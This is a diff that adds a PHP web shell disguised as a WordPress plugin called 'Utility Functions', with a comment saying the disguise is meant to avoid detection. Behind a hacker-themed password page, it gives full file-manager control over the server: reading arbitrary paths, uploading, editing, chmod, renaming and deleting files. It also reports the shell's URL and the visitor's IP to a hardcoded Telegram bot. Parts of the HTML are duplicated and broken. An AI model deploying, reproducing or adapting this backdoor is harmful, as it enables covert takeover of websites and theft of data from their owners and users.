@@ -1,0 +1,891 @@
+<?php
+// Mimic WordPress or CMS file to avoid detection
+/*
+ * Plugin Name: Utility Functions
+ * Description: Core utility functions for site management
+ * Version: 1.0
+ * Author: Site Admin
+ */
+
+// Aktifkan session
+session_start();
+
+// Password bcrypt (ganti dengan hash Anda)
+$storedHash = '$2y$10$E7vgDUlVUkl8S17fdnjwgufW4HKMGdhix2l2Y4sP8jzk009SDg0U6'; // Ganti dengan hash bcrypt yang dibuat
+// Untuk membuat hash: echo password_hash('your_password', PASSWORD_BCRYPT);
+
+// Cek login
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key'])) {
+        $key = $_POST['key'];
+        if (password_verify($key, $storedHash)) {
+            $_SESSION['authenticated'] = true;
+            session_regenerate_id(true);
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Invalid key!";
+        }
+    }
+    ?>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>SHELL KONTOLE</title>
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: url('https://giffiles.alphacoders.com/120/120383.gif') no-repeat center center fixed;
+            background-size: cover;
+            color: #00ffcc;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.6); /* overlay transparan */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #00ffcc;
+        }
+
+        header pre {
+            text-shadow: 0 0 8px #00ffcc;
+            font-size: 14px;
+        }
+
+        input[type=password] {
+            width: 250px;
+            height: 25px;
+            color: #00ffcc;
+            background: transparent;
+            border: 1px dotted #00ffcc;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+
+    
+    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INDONESIAN HACKER RULEZ V1</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Source+Code+Pro:wght@400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Source Code Pro', monospace;
+            background: #000;
+            color: #00ff00;
+            overflow: hidden;
+            position: relative;
+            height: 100vh;
+        }
+
+        /* Animated Background */
+        .bg-matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e);
+            z-index: -2;
+        }
+
+        .matrix-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .matrix-column {
+            position: absolute;
+            top: -100%;
+            font-size: 14px;
+            color: #00ff00;
+            opacity: 0.7;
+            white-space: nowrap;
+            animation: matrixFall linear infinite;
+        }
+
+        @keyframes matrixFall {
+            to {
+                top: 100vh;
+            }
+        }
+
+        /* Glitch Grid Background */
+        .grid-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0,255,255,0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,255,0.1) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridFlicker 2s infinite;
+            z-index: -1;
+        }
+
+        @keyframes gridFlicker {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.1; }
+        }
+
+        /* Main Container */
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 20, 40, 0.95);
+            border: 2px solid #00ffff;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 
+                0 0 50px rgba(0, 255, 255, 0.5),
+                inset 0 0 20px rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            min-width: 400px;
+            animation: containerPulse 3s infinite ease-in-out;
+        }
+
+        @keyframes containerPulse {
+            0%, 100% { 
+                box-shadow: 0 0 50px rgba(0, 255, 255, 0.5), inset 0 0 20px rgba(0, 0, 0, 0.8); 
+            }
+            50% { 
+                box-shadow: 0 0 80px rgba(0, 255, 255, 0.8), inset 0 0 20px rgba(0, 0, 0, 0.8); 
+            }
+        }
+
+        /* Header */
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-family: 'Orbitron', monospace;
+            font-size: 28px;
+            font-weight: 900;
+            color: #00ffff;
+            text-shadow: 0 0 20px #00ffff;
+            margin-bottom: 10px;
+            animation: logoGlitch 4s infinite;
+        }
+
+        @keyframes logoGlitch {
+            0%, 90%, 100% {
+                transform: translate(0);
+                filter: hue-rotate(0deg);
+            }
+            10% {
+                transform: translate(-2px, 1px);
+                filter: hue-rotate(90deg);
+            }
+            20% {
+                transform: translate(2px, -1px);
+                filter: hue-rotate(180deg);
+            }
+        }
+
+        .subtitle {
+            font-size: 12px;
+            color: #00ff00;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        /* Terminal Lines */
+        .terminal-line {
+            font-family: 'Source Code Pro', monospace;
+            color: #00ff00;
+            font-size: 12px;
+            margin: 5px 0;
+            opacity: 0;
+            animation: terminalType 0.5s forwards;
+        }
+
+        .terminal-line:nth-child(1) { animation-delay: 0.5s; }
+        .terminal-line:nth-child(2) { animation-delay: 1s; }
+        .terminal-line:nth-child(3) { animation-delay: 1.5s; }
+
+        @keyframes terminalType {
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 12px;
+            color: #00ffff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 12px 15px;
+            font-family: 'Source Code Pro', monospace;
+            font-size: 14px;
+            color: #00ff00;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus {
+            border-color: #00ffff;
+            box-shadow: 
+                0 0 15px rgba(0, 255, 255, 0.5),
+                inset 0 0 10px rgba(0, 255, 255, 0.1);
+            background: rgba(0, 20, 20, 0.9);
+        }
+
+        .form-input::placeholder {
+            color: #004400;
+        }
+
+        /* Button */
+        .hack-button {
+            width: 100%;
+            background: linear-gradient(45deg, #ff0080, #8000ff);
+            border: none;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: 'Orbitron', monospace;
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .hack-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 0, 128, 0.4);
+        }
+
+        .hack-button:active {
+            transform: translateY(0);
+        }
+
+        .hack-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: all 0.5s;
+        }
+
+        .hack-button:hover::before {
+            left: 100%;
+        }
+
+        /* Status Messages */
+        .status-bar {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #444;
+            border-radius: 5px;
+            min-height: 50px;
+        }
+
+        .status-text {
+            font-size: 11px;
+            color: #00ff00;
+            font-family: 'Source Code Pro', monospace;
+        }
+
+        /* Security Features */
+        .security-indicator {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 12px;
+            color: #ff0080;
+        }
+
+        .security-level {
+            position: absolute;
+            bottom: 15px;
+            left: 15px;
+            font-size: 10px;
+            color: #00ffff;
+            text-transform: uppercase;
+        }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .login-container {
+                margin: 20px;
+                min-width: auto;
+                width: calc(100% - 40px);
+                padding: 30px 20px;
+            }
+            
+            .logo {
+                font-size: 24px;
+            }
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: none;
+            text-align: center;
+            color: #00ffff;
+        }
+
+        .loading.active {
+            display: block;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00ffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Glitch Effect */
+        .glitch {
+            animation: glitch 0.3s ease-in-out;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-matrix"></div>
+    <div class="grid-overlay"></div>
+    <div class="matrix-rain" id="matrixRain"></div>
+
+    <!-- Main Login Container -->
+    <div class="login-container" id="loginContainer">
+        <!-- Security Indicators -->
+        <div class="security-indicator">
+            <i class="fas fa-shield-alt"></i> SEC-LV5
+        </div>
+        <div class="security-level">
+            INDONESIAN HACKER RULEZ FIREWALL ACTIVE
+        </div>
+
+        <!-- Header -->
+        <div class="login-header">
+            <div class="logo">◢ INDONESIAN HACKER RULEZ ◣</div>
+            <div class="subtitle"></> PHPFILEMANAGER </></div>
+        </div>
+
+        <!-- Terminal Simulation -->
+        <div class="terminal-line">> Initializing secure connection...</div>
+        <div class="terminal-line">> Quantum encryption enabled</div>
+        <div class="terminal-line">> Awaiting filemanager authorization...</div>
+  <div class="terminal-line">><</div>
+
+        <!-- Login Form -->
+               <form method="post">
+                    <input type="password" name="key" placeholder="Enter Key" required>
+                    <input type="submit" value="Login">
+                
+</form>
+</div>
+
+
+  
+
+
+
+                <?php if (isset($error)): ?>
+                    <p class="error"><?php echo htmlspecialchars($error); ?></p>
+                <?php endif; ?>
+            </div>
+
+
+  
+
+            <button type="submit" class="hack-button">
+                <i class="fas fa-brain"></i>  INDONESIAN HACKER RULEZ 
+            </button>
+        </form>
+
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-text" id="statusText">
+                Status: Awaiting authorization | Encryption: AES-256 | Connection: Secure
+            </div>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                Establishing filemanager connection...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Rain Effect
+        function createMatrixRain() {
+            const matrixContainer = document.getElementById('matrixRain');
+            const chars = '01ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ';
+            
+            for (let i = 0; i < 50; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                column.style.animationDelay = Math.random() * 2 + 's';
+                
+                let columnText = '';
+                for (let j = 0; j < 20; j++) {
+                    columnText += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                }
+                column.innerHTML = columnText;
+                
+                matrixContainer.appendChild(column);
+            }
+        }
+
+        // Initialize matrix effect
+        createMatrixRain();
+
+        // Form handling with cyberpunk effects (only for visual effects, real submission handled by PHP)
+        const loginForm = document.getElementById('loginForm');
+        const loginContainer = document.getElementById('loginContainer');
+        const statusText = document.getElementById('statusText');
+        const loading = document.getElementById('loading');
+
+        loginForm.addEventListener('submit', function(e) {
+            // Add glitch effect
+            loginContainer.classList.add('glitch');
+            setTimeout(() => loginContainer.classList.remove('glitch'), 300);
+            
+            // Show loading animation while PHP processes
+            statusText.style.display = 'none';
+            loading.classList.add('active');
+            
+            // Let the form submit normally to PHP});
+
+        // Typing effect for status updates
+        function typeWriter(element, text, speed = 50) {
+            let i = 0;
+            element.innerHTML = '';
+            const timer = setInterval(() => {
+                if (i < text.length) {
+                    element.innerHTML += text.charAt(i);
+                    i++;
+                } else {
+                    clearInterval(timer);
+                }
+            }, speed);
+        }
+
+        // Random status updates
+        const statusMessages = [
+            'Status: Monitoring neural pathways | Encryption: Quantum | Threat Level: Green',
+            'Status: Scanning for intrusions | Firewall: Active | Last Access: 00:42:13',
+            'Status: System optimal | Neural bandwidth: 98.7% | Uptime: 127 days'
+        ];
+
+        setInterval(() => {
+            if (!loading.classList.contains('active')) {
+                const randomMessage = statusMessages[Math.floor(Math.random() * statusMessages.length)];
+                typeWriter(statusText, randomMessage, 30);
+            }
+        }, 8000);
+
+        // Input field effects
+        const inputs = document.querySelectorAll('.form-input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.textShadow = '0 0 10px #00ff00';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.textShadow = 'none';
+            });
+        });
+
+        // Keyboard sound simulation (optional)
+        document.addEventListener('keydown', function(e) {
+            // Add subtle flash effect on keypress
+            document.body.style.boxShadow = 'inset 0 0 100px rgba(0, 255, 255, 0.1)';
+            setTimeout(() => {
+                document.body.style.boxShadow = 'none';
+            }, 100);
+        });
+    </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Logout
+if (isset($_GET['logout'])) {
+    session_unset();
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+?>
+<?php
+set_time_limit(0);
+error_reporting(0);
+$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
+$chatId = "8478623770";
+$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
+$logMessage =
+    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
+    $_SERVER["REMOTE_ADDR"] .
+    " ]";
+sendTelegramMessage($botToken, $chatId, $logMessage);
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!DOCTYPE HTML>
+<HTML>
+<HEAD>
+<link href="" rel="stylesheet" type="text/css">
+<title>ALPINE FILEMANAGER</title>
+<style>
+body{
+font-family: "Roboto", cursive;
+background-color:black;
+color:white;
+}
+#content .first{
+background-color:green;
+}
+table{
+border: 3px green double;
+}
+H1{
+font-family: "Rye", cursive;
+}
+a{
+color:green;
+text-decoration: none;
+}
+a:hover{
+color:white;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #fff solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</HEAD>
+<BODY>
+<table width="1000" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Current Path : ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+echo '</td></tr><tr><td>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="green">File Upload Done Kakak ~_^ .</font><br />';
+}else{
+echo '<font color="red">File Upload Error ~_~.</font><br />';
+}
+}
+echo '<form enctype="multipart/form-data" method="POST">
+Upload File : <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr>';
+if(isset($_GET['filesrc'])){
+echo '</table><br />';
+echo('<center><textarea cols=140 rows=37 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><center><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="green">Change Permission Done.</font><br />';
+}else{
+echo '<font color="red">Change Permission Error.</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="green">Change Name Done.</font><br />';
+}else{
+echo '<font color="red">Change Name Error.</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="green">Edit File Done ~_^.</font><br />';
+}else{
+echo '<font color="red">Edit File Error ~_~.</font><br />';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=140 rows=35 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Go" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br /><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<font color="green">Delete Dir Done.</font><br />';
+}else{
+echo '<font color="red">Delete Dir Error.</font><br />';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<font color="green">Delete File Done.</font><br />';
+}else{
+echo '<font color="red">Delete File Error.</font><br />';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="1000" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>';
+
+foreach($scandir as $dir){
+if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+echo "<tr>
+<td><a href=\"?path=$path/$dir\">$dir</a></td>
+<td><center>--</center></td>
+<td><center>";
+if(is_writable("$path/$dir")) echo '<font color="green">';
+elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+echo perms("$path/$dir");
+if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"$dir\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+<input type=\"submit\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file("$path/$file")) continue;
+$size = filesize("$path/$file")/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo "<tr>
+<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>";
+if(is_writable("$path/$file")) echo '<font color="green">';
+elseif(!is_readable("$path/$file")) echo '<font color="red">';
+echo perms("$path/$file");
+if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+<option value=\"edit\">Edit</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+<input type=\"submit\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '</table></div></html>';
+}
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+function sendTelegramMessage($botToken, $chatId, $message)
+{
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+    $options = [
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($params),
+        ],
+    ];
+    $context = stream_context_create($options);
+    $response = file_get_contents($url, false, $context);
+
+}
+
+
+?>
+
